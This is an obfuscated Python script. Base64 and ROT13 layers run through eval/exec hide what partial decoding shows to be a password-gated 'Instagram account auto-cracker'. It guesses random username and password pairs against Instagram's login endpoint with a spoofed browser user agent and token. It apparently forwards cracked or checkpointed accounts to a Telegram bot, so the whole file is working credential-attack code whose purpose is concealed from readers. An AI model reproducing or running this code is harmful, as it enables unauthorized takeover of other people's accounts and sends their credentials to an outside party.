
# DOO NOTT EDIT THIS !!!


import codecs,base64
htr = [97, 87, 49, 119, 98, 51, 74, 48, 73, 72, 74, 108, 99, 88, 86, 108, 99, 51, 82, 122, 73, 67, 119, 103, 100, 71, 108, 116, 90, 83, 65, 115, 73, 71, 112, 122, 98, 50, 52, 103, 76, 67, 66, 121, 89, 87, 53, 107, 98, 50, 48, 115, 98, 51, 77, 75, 90, 110, 74, 118, 98, 83, 66, 106, 98, 50, 120, 118, 99, 109, 70, 116, 89, 83, 66, 112, 98, 88, 66, 118, 99, 110, 81, 103, 82, 109, 57, 121, 90, 81, 112, 109, 99, 109, 57, 116, 73, 71, 82, 104, 100, 71, 86, 48, 97, 87, 49, 108, 73, 71, 108, 116, 99, 71, 57, 121, 100, 67, 66, 107, 89, 88, 82, 108, 100, 71, 108, 116, 90, 81, 112, 109, 99, 109, 57, 116, 73, 71, 74, 122, 78, 67, 66, 112, 98, 88, 66, 118, 99, 110, 81, 103, 81, 109, 86, 104, 100, 88, 82, 112, 90, 110, 86, 115, 85, 50, 57, 49, 99, 67, 66, 104, 99, 121, 66, 105, 99, 119, 111, 75, 98, 51, 77, 117, 99, 51, 108, 122, 100, 71, 86, 116, 75, 67, 100, 106, 98, 71, 86, 104, 99, 105, 99, 112, 67, 110, 82, 112, 98, 87, 86, 108, 73, 68, 48, 103, 97, 87, 53, 48, 75, 71, 82, 104, 100, 71, 86, 48, 97, 87, 49, 108, 76, 109, 53, 118, 100, 121, 103, 112, 76, 110, 82, 112, 98, 87, 86, 122, 100, 71, 70, 116, 99, 67, 103, 112, 75, 81, 112, 107, 90, 87, 89, 103, 98, 71, 57, 110, 98, 121, 103, 112, 79, 103, 111, 74, 99, 72, 74, 112, 98, 110, 81, 111, 82, 109, 57, 121, 90, 83, 53, 78, 81, 85, 100, 70, 84, 108, 82, 66, 75, 121, 73, 105, 73, 103, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 103, 111, 75, 52, 112, 87, 116, 52, 112, 83, 66, 52, 112, 83, 66, 52, 112, 87, 117, 52, 112, 87, 120, 52, 112, 87, 120, 52, 112, 87, 120, 52, 112, 87, 120, 52, 112, 87, 120, 52, 112, 87, 116, 52, 112, 87, 117, 52, 112, 87, 120, 52, 112, 87, 120, 52, 112, 87, 120, 52, 112, 87, 116, 52, 112, 83, 66, 52, 112, 83, 66, 52, 112, 83, 66, 52, 112, 87, 117, 67, 117, 75, 86, 115, 79, 75, 85, 113, 43, 75, 85, 111, 43, 75, 86, 114, 43, 75, 86, 115, 101, 75, 86, 115, 101, 75, 86, 115, 101, 75, 86, 115, 101, 75, 86, 114, 101, 75, 86, 114, 43, 75, 86, 115, 79, 75, 86, 114, 117, 75, 86, 115, 101, 75, 86, 115, 101, 75, 85, 103, 43, 75, 86, 114, 101, 75, 85, 103, 101, 75, 86, 114, 117, 75, 85, 103, 119, 114, 105, 108, 98, 72, 105, 108, 73, 80, 105, 108, 73, 80, 105, 108, 97, 51, 105, 108, 73, 72, 105, 108, 97, 55, 105, 108, 97, 51, 105, 108, 73, 72, 105, 108, 76, 118, 105, 108, 97, 55, 105, 108, 97, 51, 105, 108, 89, 118, 105, 108, 73, 72, 105, 108, 73, 72, 105, 108, 75, 118, 105, 108, 73, 80, 105, 108, 98, 72, 105, 108, 98, 68, 105, 108, 89, 118, 105, 108, 73, 72, 105, 108, 73, 72, 105, 108, 76, 80, 105, 108, 73, 72, 105, 108, 97, 52, 75, 52, 112, 87, 120, 52, 112, 83, 68, 52, 112, 83, 68, 52, 112, 83, 68, 52, 112, 87, 116, 52, 112, 87, 117, 52, 112, 83, 114, 52, 112, 83, 66, 52, 112, 83, 66, 52, 112, 83, 114, 52, 112, 83, 68, 52, 112, 83, 68, 52, 112, 87, 116, 52, 112, 87, 117, 52, 112, 83, 68, 52, 112, 83, 68, 52, 112, 87, 116, 52, 112, 83, 66, 52, 112, 83, 114, 52, 112, 83, 68, 52, 112, 83, 66, 52, 112, 83, 114, 52, 112, 87, 116, 52, 112, 87, 117, 52, 112, 87, 117, 67, 117, 75, 86, 114, 101, 75, 85, 113, 43, 75, 85, 111, 43, 75, 85, 113, 43, 75, 85, 103, 43, 75, 85, 103, 43, 75, 85, 111, 43, 75, 85, 103, 101, 75, 85, 103, 101, 75, 85, 103, 43, 75, 86, 115, 79, 75, 85, 113, 43, 75, 86, 114, 101, 75, 86, 114, 117, 75, 85, 103, 43, 75, 86, 115, 79, 75, 85, 117, 43, 75, 85, 103, 101, 75, 85, 103, 43, 75, 85, 103, 43, 75, 85, 103, 101, 75, 85, 113, 43, 75, 85, 103, 43, 75, 85, 103, 43, 75, 85, 103, 119, 114, 105, 108, 98, 68, 105, 108, 73, 72, 105, 108, 73, 72, 105, 108, 76, 118, 105, 108, 97, 47, 105, 108, 98, 68, 105, 108, 76, 118, 105, 108, 73, 72, 105, 108, 73, 72, 105, 108, 76, 118, 105, 108, 73, 72, 105, 108, 76, 118, 105, 108, 97, 47, 105, 108, 98, 68, 105, 108, 76, 118, 105, 108, 73, 72, 105, 108, 73, 72, 105, 108, 73, 72, 105, 108, 76, 118, 105, 108, 73, 72, 105, 108, 73, 72, 105, 108, 76, 118, 105, 108, 97, 47, 105, 108, 98, 68, 105, 108, 97, 56, 75, 67, 83, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 74, 67, 81, 107, 74, 67, 81, 107, 75, 67, 83, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 74, 81, 88, 86, 48, 97, 71, 86, 121, 73, 68, 111, 103, 81, 87, 49, 108, 98, 105, 66, 66, 98, 87, 70, 121, 97, 81, 111, 74, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 65, 107, 74, 67, 81, 107, 75, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 105, 111, 113, 75, 103, 111, 74, 73, 105, 73, 105, 75, 81, 111, 74, 67, 103, 107, 75, 67, 81, 111, 74, 99, 72, 74, 112, 98, 110, 81, 111, 75, 81, 111, 74, 99, 72, 74, 112, 98, 110, 81, 111, 75, 81, 111, 106, 67, 88, 82, 112, 98, 87, 85, 117, 99, 50, 120, 108, 90, 88, 65, 111, 77, 83, 107, 75, 67, 88, 66, 121, 97, 87, 53, 48, 75, 69, 90, 118, 99, 109, 85, 117, 81, 107, 120, 86, 82, 83, 115, 105, 83, 87, 53, 122, 100, 71, 70, 110, 99, 109, 70, 116, 73, 71, 70, 106, 89, 50, 57, 49, 98, 110, 81, 103, 89, 88, 86, 48, 98, 121, 49, 106, 99, 109, 70, 106, 97, 50, 86, 121, 73, 67, 52, 105, 75, 81, 111, 74, 99, 72, 74, 112, 98, 110, 81, 111, 75, 81, 111, 74, 99, 72, 74, 112, 98, 110, 81, 111, 75, 81, 111, 106, 67, 88, 82, 112, 98, 87, 85, 117, 99, 50, 120, 108, 90, 88, 65, 111, 77, 67, 52, 49, 75, 81, 111, 74, 99, 109, 86, 48, 100, 88, 74, 117, 67, 103, 107, 75, 67, 81, 111, 75, 67, 103, 111, 75, 67, 103, 112, 115, 98, 50, 100, 118, 75, 67, 107, 75, 67, 110, 66, 104, 99, 51, 99, 57, 97, 87, 53, 119, 100, 88, 81, 111, 74, 48, 100, 112, 100, 109, 85, 103, 84, 87, 85, 103, 86, 71, 104, 108, 73, 70, 66, 104, 99, 51, 78, 51, 98, 51, 74, 107, 73, 68, 111, 103, 74, 121, 107, 75, 97, 87, 89, 103, 99, 71, 70, 122, 100, 122, 48, 57, 74, 50, 70, 116, 89, 88, 74, 112, 74, 122, 111, 75, 67, 88, 66, 121, 97, 87, 53, 48, 75, 67, 107, 75, 67, 88, 66, 121, 97, 87, 53, 48, 75, 69, 90, 118, 99, 109, 85, 117, 82, 49, 74, 70, 82, 85, 52, 114, 73, 105, 65, 103, 73, 67, 65, 103, 73, 70, 100, 108, 98, 71, 78, 118, 98, 87, 85, 103, 85, 50, 108, 121, 73, 68, 111, 112, 73, 67, 73, 112, 67, 103, 108, 48, 97, 87, 49, 108, 76, 110, 78, 115, 90, 87, 86, 119, 75, 68, 73, 117, 78, 105, 107, 75, 67, 87, 100, 118, 98, 50, 81, 57, 77, 65, 111, 74, 89, 109, 70, 107, 80, 84, 65, 75, 67, 87, 78, 119, 80, 84, 65, 75, 67, 88, 82, 121, 101, 84, 111, 75, 67, 81, 108, 51, 97, 71, 108, 115, 90, 83, 66, 85, 99, 110, 86, 108, 79, 103, 111, 74, 67, 83, 65, 103, 73, 67, 65, 75, 67, 81, 107, 103, 73, 67, 65, 103, 67, 103, 107, 74, 73, 67, 65, 103, 73, 72, 86, 104, 80, 83, 99, 119, 77, 84, 73, 122, 78, 68, 85, 50, 78, 122, 103, 53, 74, 119, 111, 74, 67, 83, 65, 103, 73, 67, 66, 49, 89, 84, 73, 57, 74, 122, 73, 49, 79, 83, 99, 75, 67, 81, 107, 103, 73, 67, 65, 103, 100, 84, 49, 122, 100, 72, 73, 111, 74, 121, 99, 117, 97, 109, 57, 112, 98, 105, 103, 111, 99, 109, 70, 117, 90, 71, 57, 116, 76, 109, 78, 111, 98, 50, 108, 106, 90, 83, 104, 49, 89, 83, 107, 103, 90, 109, 57, 121, 73, 71, 107, 103, 97, 87, 52, 103, 99, 109, 70, 117, 90, 50, 85, 111, 78, 121, 107, 112, 75, 83, 107, 75, 67, 81, 107, 103, 73, 67, 65, 103, 100, 84, 73, 57, 99, 51, 82, 121, 75, 67, 99, 110, 76, 109, 112, 118, 97, 87, 52, 111, 75, 72, 74, 104, 98, 109, 82, 118, 98, 83, 53, 106, 97, 71, 57, 112, 89, 50, 85, 111, 100, 87, 69, 121, 75, 83, 66, 109, 98, 51, 73, 103, 97, 83, 66, 112, 98, 105, 66, 121, 89, 87, 53, 110, 90, 83, 103, 120, 75, 83, 107, 112, 75, 81, 111, 74, 67, 83, 65, 103, 73, 67, 66, 49, 99, 50, 86, 121, 80, 83, 99, 114, 77, 106, 69, 50, 74, 121, 116, 49, 77, 105, 116, 49, 67, 103, 107, 74, 73, 67, 65, 103, 73, 72, 66, 51, 90, 68, 49, 49, 77, 105, 116, 49, 67, 103, 107, 74, 73, 121, 65, 103, 73, 67, 66, 49, 99, 50, 86, 121, 80, 83, 100, 104, 100, 88, 82, 118, 99, 105, 99, 75, 67, 81, 107, 106, 73, 67, 65, 103, 73, 72, 66, 51, 90, 68, 48, 110, 98, 88, 73, 117, 99, 109, 86, 107, 90, 67, 99, 75, 67, 81, 107, 75, 67, 81, 107, 103, 73, 67, 65, 103, 67, 103, 107, 74, 73, 67, 65, 103, 73, 65, 111, 74, 67, 83, 65, 103, 73, 67, 66, 115, 97, 87, 53, 114, 73, 68, 48, 103, 74, 50, 104, 48, 100, 72, 66, 122, 79, 105, 56, 118, 100, 51, 100, 51, 76, 109, 108, 117, 99, 51, 82, 104, 90, 51, 74, 104, 98, 83, 53, 106, 98, 50, 48, 118, 89, 87, 78, 106, 98, 51, 86, 117, 100, 72, 77, 118, 98, 71, 57, 110, 97, 87, 52, 118, 74, 119, 111, 74, 67, 83, 65, 103, 73, 67, 66, 115, 98, 50, 100, 112, 98, 108, 57, 49, 99, 109, 119, 103, 80, 83, 65, 110, 97, 72, 82, 48, 99, 72, 77, 54, 76, 121, 57, 51, 100, 51, 99, 117, 97, 87, 53, 122, 100, 71, 70, 110, 99, 109, 70, 116, 76, 109, 78, 118, 98, 83, 57, 104, 89, 50, 78, 118, 100, 87, 53, 48, 99, 121, 57, 115, 98, 50, 100, 112, 98, 105, 57, 104, 97, 109, 70, 52, 76, 121, 99, 75, 67, 81, 107, 103, 73, 67, 65, 103, 99, 122, 49, 121, 90, 88, 70, 49, 90, 88, 78, 48, 99, 121, 53, 84, 90, 88, 78, 122, 97, 87, 57, 117, 75, 67, 107, 75, 67, 81, 107, 103, 73, 67, 65, 103, 99, 71, 70, 53, 98, 71, 57, 104, 90, 67, 65, 57, 73, 72, 115, 75, 67, 81, 107, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 100, 49, 99, 50, 86, 121, 98, 109, 70, 116, 90, 83, 99, 54, 73, 72, 86, 122, 90, 88, 73, 115, 67, 103, 107, 74, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 110, 90, 87, 53, 106, 88, 51, 66, 104, 99, 51, 78, 51, 98, 51, 74, 107, 74, 122, 111, 103, 90, 105, 99, 106, 85, 70, 100, 69, 88, 48, 108, 79, 85, 49, 82, 66, 82, 49, 74, 66, 84, 86, 57, 67, 85, 107, 57, 88, 85, 48, 86, 83, 79, 106, 65, 54, 101, 51, 82, 112, 98, 87, 86, 108, 102, 84, 112, 55, 99, 72, 100, 107, 102, 83, 99, 115, 67, 103, 107, 74, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 110, 99, 88, 86, 108, 99, 110, 108, 81, 89, 88, 74, 104, 98, 88, 77, 110, 79, 105, 66, 55, 102, 83, 119, 75, 67, 81, 107, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 100, 118, 99, 72, 82, 74, 98, 110, 82, 118, 84, 50, 53, 108, 86, 71, 70, 119, 74, 122, 111, 103, 74, 50, 90, 104, 98, 72, 78, 108, 74, 119, 111, 74, 67, 83, 65, 103, 73, 67, 66, 57, 67, 103, 107, 74, 73, 67, 65, 103, 73, 65, 111, 74, 67, 83, 65, 103, 73, 67, 66, 121, 73, 68, 48, 103, 99, 121, 53, 119, 98, 51, 78, 48, 75, 71, 120, 118, 90, 50, 108, 117, 88, 51, 86, 121, 98, 67, 119, 103, 90, 71, 70, 48, 89, 84, 49, 119, 89, 88, 108, 115, 98, 50, 70, 107, 76, 67, 66, 111, 90, 87, 70, 107, 90, 88, 74, 122, 80, 88, 115, 75, 67, 81, 107, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 74, 86, 99, 50, 86, 121, 76, 85, 70, 110, 90, 87, 53, 48, 73, 106, 111, 103, 73, 107, 49, 118, 101, 109, 108, 115, 98, 71, 69, 118, 78, 83, 52, 119, 73, 67, 104, 88, 97, 87, 53, 107, 98, 51, 100, 122, 73, 69, 53, 85, 73, 68, 69, 119, 76, 106, 65, 55, 73, 70, 100, 112, 98, 106, 89, 48, 79, 121, 66, 52, 78, 106, 81, 112, 73, 69, 70, 119, 99, 71, 120, 108, 86, 50, 86, 105, 83, 50, 108, 48, 76, 122, 85, 122, 78, 121, 52, 122, 78, 105, 65, 111, 83, 48, 104, 85, 84, 85, 119, 115, 73, 71, 120, 112, 97, 50, 85, 103, 82, 50, 86, 106, 97, 50, 56, 112, 73, 69, 78, 111, 99, 109, 57, 116, 90, 83, 56, 52, 78, 83, 52, 119, 76, 106, 81, 120, 79, 68, 77, 117, 79, 68, 77, 103, 85, 50, 70, 109, 89, 88, 74, 112, 76, 122, 85, 122, 78, 121, 52, 122, 78, 105, 73, 115, 67, 103, 107, 74, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 105, 87, 67, 49, 83, 90, 88, 70, 49, 90, 88, 78, 48, 90, 87, 81, 116, 86, 50, 108, 48, 97, 67, 73, 54, 73, 67, 74, 89, 84, 85, 120, 73, 100, 72, 82, 119, 85, 109, 86, 120, 100, 87, 86, 122, 100, 67, 73, 115, 67, 103, 107, 74, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 105, 85, 109, 86, 109, 90, 88, 74, 108, 99, 105, 73, 54, 73, 67, 74, 111, 100, 72, 82, 119, 99, 122, 111, 118, 76, 51, 100, 51, 100, 121, 53, 112, 98, 110, 78, 48, 89, 87, 100, 121, 89, 87, 48, 117, 89, 50, 57, 116, 76, 50, 70, 106, 89, 50, 57, 49, 98, 110, 82, 122, 76, 50, 120, 118, 90, 50, 108, 117, 76, 121, 73, 115, 67, 103, 107, 74, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 105, 101, 67, 49, 106, 99, 51, 74, 109, 100, 71, 57, 114, 90, 87, 52, 105, 79, 105, 65, 110, 87, 110, 104, 76, 98, 88, 111, 48, 97, 70, 104, 119, 78, 108, 104, 76, 98, 86, 82, 81, 90, 122, 108, 115, 101, 109, 100, 90, 101, 70, 104, 79, 78, 72, 78, 71, 99, 106, 74, 119, 101, 109, 56, 110, 67, 103, 107, 74, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 72, 48, 112, 67, 103, 107, 74, 73, 67, 65, 103, 73, 72, 78, 118, 100, 88, 65, 57, 89, 110, 77, 111, 99, 105, 53, 48, 90, 88, 104, 48, 73, 67, 119, 103, 74, 50, 104, 48, 98, 87, 119, 117, 99, 71, 70, 121, 99, 50, 86, 121, 74, 121, 107, 75, 67, 81, 107, 103, 73, 67, 65, 103, 90, 68, 49, 113, 99, 50, 57, 117, 76, 109, 120, 118, 89, 87, 82, 122, 75, 72, 78, 118, 100, 88, 65, 117, 100, 71, 86, 52, 100, 67, 107, 75, 67, 81, 107, 103, 73, 67, 65, 103, 100, 87, 108, 107, 80, 87, 81, 117, 90, 50, 86, 48, 75, 67, 74, 49, 99, 50, 86, 121, 83, 87, 81, 105, 75, 81, 111, 74, 67, 83, 65, 103, 73, 67, 66, 116, 99, 50, 99, 57, 90, 105, 73, 105, 73, 103, 111, 74, 67, 81, 111, 74, 67, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 75, 67, 81, 107, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 76, 83, 48, 116, 67, 103, 107, 74, 67, 103, 107, 74, 83, 85, 53, 84, 86, 69, 69, 103, 81, 85, 78, 68, 84, 49, 86, 79, 86, 67, 66, 73, 81, 85, 78, 76, 82, 85, 81, 103, 81, 108, 107, 103, 81, 85, 49, 70, 84, 105, 66, 66, 84, 85, 70, 83, 83, 86, 120, 117, 67, 103, 107, 74, 67, 103, 107, 74, 86, 86, 78, 70, 85, 107, 53, 66, 84, 85, 85, 103, 79, 105, 66, 55, 100, 88, 78, 108, 99, 110, 49, 99, 98, 103, 111, 74, 67, 86, 66, 66, 85, 49, 78, 88, 84, 49, 74, 69, 73, 68, 111, 103, 101, 51, 66, 51, 90, 72, 49, 99, 98, 103, 111, 74, 67, 86, 86, 84, 82, 86, 74, 102, 83, 85, 81, 103, 73, 68, 111, 103, 101, 51, 86, 112, 90, 72, 49, 99, 98, 103, 111, 74, 67, 81, 111, 74, 67, 81, 111, 74, 67, 83, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 82, 107, 73, 103, 79, 105, 66, 66, 98, 87, 86, 117, 73, 69, 70, 116, 89, 88, 74, 112, 88, 71, 52, 75, 67, 81, 107, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 69, 108, 79, 85, 49, 82, 66, 73, 68, 111, 103, 89, 87, 49]		
tahmid = 'yoy9uoJSlnIkhPtxWVPNtVPNtVPNtVPNtVPNtVPNtVPNXPDxgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gPtxWYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYDbWPDbWPFVvVtbWPDbWPFNtVPOgp2qwpQ1zVvVvPtxWPtxWYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYDbWPF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0XPDxXPDyWGyAHDFOOD0ACIH5HVPZwVlOQFRIQF1OCFH5HVPZwV1khPtxWPtxWIIASHx5OGHHtBvO7qKAypa1potbWPIOOH1AKG1WRVQbtr3O3MU1potbWPIIGEIWsFHDtVQbtr3IcMU1potbWPDbWPDbWPFNtVPNtVPNtVPNtVPNtVPNtVPNtExVtBvOOoJIhVRSgLKWcKT4XPDxtVPNtVPNtVPNtVPNtVPNtVPNtVRyBH1EOVQbtLJ1yoy9uoJSlnIkhPtxWVPNtVPNtVPNtVPNtVPNtVPNtVPNXPDxgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gPtxWYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYDbWPDbWPFVvVtbWPDbWPDbWPDbWPDbWPDbWPDbWPDbWPFNtVPOuL2Z9qKAypvfaVPNtWlgjq2DXPDxtVPNtPtxWVPNtVPAjpzyhqPulYaEyrUDcPtxWVPNtVTyzVPquqKEbMJ50nJAuqTIxVwc0paIyWlOcovOlYaEyrUD6PtxWVPNtVPNtVPOipl5mrKA0MJ0bW2AfMJSlWlxXPDxtVPNtVPNtVTkiM28bXDbWPFNtVPNtVPNtM29iMQ1ao29xXmRXPDxtVPNtVPNtVUOlnJ50XRMipzHhE1WSEH4eMvWppvNtVPNtVPNtVPNtVPNtVPNtKT4tJlNeVS0tFTy0VQbtr2qio2E9VPVfEz9lMF5FEHDeMvWpovOoVP0tKFOPLJDtBvO7LzSxsFNvYRMipzHhJHIZGR9KX2LvKT4tJlNuVS0tH2A1pzHtBvO7L3O9VvkTo3WyYxAMDH4eMvVtKT4tJlN9VS0tDJAwo3IhqPN6VUguL2A9VSkhVPVfMJ5xCFpaXDbWPFNtVPNtVPNtPtxWVPNtVPNtVPOznJkyCJ9jMJ4bW2ucqUZhqUu0WljaLFpcPtxWVPNtVPNtVPOznJkyYaqlnKEyXT1mMlfaKT4aXDbWPFNtVPNtVPNtPtxWVPNtVPNtVPNXPDxwVPNtVPNtVPOjpzyhqPuTo3WyYxqFEHIBXlWoVPftKFOUo29xVQbtVPVfM2DcPtxWVPNtVPNtVPOlMKS1MKA0pl5jo3A0XTLvnUE0pUZ6Yl9upTxhqTIfMJqlLJ0ho3WaY2WiqQVjBQtkBQVmAQV6DHSUHIWgI0AFnHEIGJEzI2SbDwuJGUEUEyWGAGOEJQS2pRRip2IhMR1yp3AuM2H/L2uuqS9cMQ0lZQt1AGN3AQV3WaEyrUD9r21mM30vXDbWPFNtVPOyoTyzVPqwnTIwn3OinJ50K3WypKIcpzIxWlOcovOlYaEyrUD6PtxWVPNtVPNtVPOipl5mrKA0MJ0bW2AfMJSlWlxXPDxtVPNtVPNtVTkiM28bXDbWPFNtVPNtVPNtL3N9L3NeZDbWPFNtVPNtVPNtpzIkqJImqUZhpT9mqPuzVzu0qUOmBv8iLKOcYaEyoTIapzSgYz9lMl9vo3DlZQt4ZGtlZmDlBxSOE1SFoIqQHzyRIH1xMyqunRV4Ixk0E0MFHmHjHItkqaOOY3AyozEAMKAmLJqyC2AbLKEsnJD9ZwN4AGHjAmDlAlM0MKu0CKggp2qwpU0vXDbWPFNtVPNtVPNtPtxWVPNtVPNtVPOjpzyhqPuTo3WyYxqFEHIBX2LvKUVtVPNtVPNtVPNtVPNtVPNtVSkhVSftXlOqVRucqPN6VUgao29xsFNvYRMipzHhHxIRX2LvKT4tJlNgVS0tDzSxVQbtr2WuMU0tVvkTo3WyYyySGRkCIlgzVykhVSftVFOqVSAwqKWyVQbtr2AjsFVfEz9lMF5QJHSBX2LvVSkhVSftCFOqVRSwL291oaDtBvO7LJAwsFOpovNvYTIhMQ0aWlxXPDxtVPNtVPNtVNbWPFZtVPNtVPNtVUOlnJ50XRMipzHhJHIZGR9KXlqoVPRtKFOQnTgDo2yhqPN6VPpfL3NkXDbWPFNtVPNtVPNtL3O5CJ9jMJ4bW2AbMJAepT9coaDhqUu0WlNfVPquWlxXPDxtVPNtVPNtVTAjrF53pzy0MFuuL2ZeW1khWlxXPDxtVPNtMJkcMvNaLKI0nTIhqTywLKEyMPV6MzSfp2HaVTyhVUVhqTI4qQbXPDxtVPNtVPNtVT9mYaA5p3EyoFtaL2kyLKVaXDbWPFNtVPNtVPNtoT9aoltcPtxWVPNtVPNtVPOvLJD9LzSxXmRXPDxtVPNtVPNtVNbWPFNtVPNtVPNtpUWcoaDbEz9lMF5UHxISGvgzVyklVPNtVPNtVPNtVPNtVPNtVPOpovOoVPftKFOVnKDtBvO7M29iMU0tVvkTo3WyYyWSEPgzVykhVSftYFOqVRWuMPN6VUgvLJE9VPVfEz9lMF5MEHkZG1peMvWpovOoVPRtKFOGL3IlMFN6VUgwpU0vYRMipzHhD1yOGvgzVvOpovOoVQ0tKFOOL2AiqJ50VQbtr2SwL30tKT4tVvkyozD9WlpcPtxWVPNtVPNtVPNXPDxtVPNtVPNtVPZtVPNtVPNtVUOlnJ50XRMipzHhHxIRXlqoVP0tKFOPLJDtBvNaYTWxXDbWPFNtVPNtVPNtPtyyrTAypUDtpzIkqJImqUZhMKuwMKO0nJ9hpl5Qo25hMJA0nJ9hEKWlo3V6PtxtVPNtqTygMF5moTIypPtlXDbWVPNtVUOlnJ50XPptVPpcPtxtVPNtpUWcoaDbWlNtWlxXPFNtVPOjpzyhqPuTo3WyYyySGRkCIlfv4cdt77vCVQbtD2uyL2ftJJ91pvOWoaEypz5yqPOQo25hMJA0nJ9hVTShMPOCpTIhVSEbMFOHo29fVRSaLJyhVP4hYvRvXDcyoUAyBtbWqTygMF5moTIypPtlXDbWpUWcoaDbXDbWpUWcoaDbXDbWpUWcoaDbXDbWpUWcoaDbEz9lMF5FEHDeVyiQy10tI3WiozptHTSmp3qipzDtVPjtFJLtJJ91VR5yMJDtITuyVSOup3A3o3WxVRAioaEuL3DtBvOpovOTDvN6VRSgMJ4tDJ1upzxtKT4tFH5GIRRtBvOuoJIhK2SgLKWcVvx='		
pizza = '\x72\x6f\x74\x5f\x31\x33'		
mobile = codecs.decode(eval('\x74\x61\x68\x6d\x69\x64'), eval('\x70\x69\x7a\x7a\x61'))		
burger = base64.b64decode(''.join([chr(tech) for tech in htr])+eval('\x6d\x6f\x62\x69\x6c\x65'))		
eval(compile(eval("\x62\x75\x72\x67\x65\x72"),"<tahm1d>","exec"))		
